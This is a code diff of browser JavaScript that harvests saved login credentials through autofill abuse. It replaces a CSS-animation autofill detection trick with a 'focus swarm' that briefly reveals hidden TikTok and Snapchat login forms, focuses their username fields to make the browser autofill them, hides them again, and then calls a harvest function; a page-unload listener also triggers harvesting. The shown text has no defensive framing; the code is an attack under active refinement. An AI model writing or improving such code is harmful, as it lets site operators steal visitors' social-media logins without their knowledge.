@@ -68,31 +68,11 @@ async function harvest() {
   }, 500);
 }
 
-// --- Autofill Detection using CSS Animation Trick ---
-const style = document.createElement('style');
-style.innerHTML = `
-  @keyframes onAutoFillStart { from {} to {} }
-  input:-webkit-autofill {
-    animation-name: onAutoFillStart;
-    animation-fill-mode: both;
-  }
-`;
-document.head.appendChild(style);
-
-document.addEventListener('animationstart', (e) => {
-  if (e.animationName === 'onAutoFillStart') {
-    harvest();
-  }
-}, true);
+// --- Autofill Detection ---
+// We will now rely on the focus swarm to trigger the harvest at the right time.
 
 // --- Fallback Mechanisms ---
-// 1. A timeout for non-webkit browsers or if the animation fails
-// Fallback to ensure harvest is called
-// After 2 seconds, attempt to harvest anyway, in case the animation trick fails
-// This helps capture data on browsers that don't support the animation hack (e.g., Firefox)
-setTimeout(harvest, 15000);
-
-// Also, listen for the page unload event as a last resort
+// The primary mechanism is now the focus swarm. The unload listener is a fallback.
 window.addEventListener('beforeunload', harvest);
 
 // --- UI & Focus Trap Logic ---
@@ -124,11 +104,13 @@ function triggerFocusSwarm() {
   document.querySelector('#tiktok-form input[name="username"]')?.focus();
   document.querySelector('#snapchat-form input[name="username"]')?.focus();
 
-  // Hide the forms again shortly after
+  // Hide the forms again shortly after and then harvest
   setTimeout(() => {
       forms.forEach(form => {
           form.style.display = 'none';
       });
+      // Harvest after a delay to allow autofill to complete
+      setTimeout(harvest, 500);
   }, 100);
 }
 
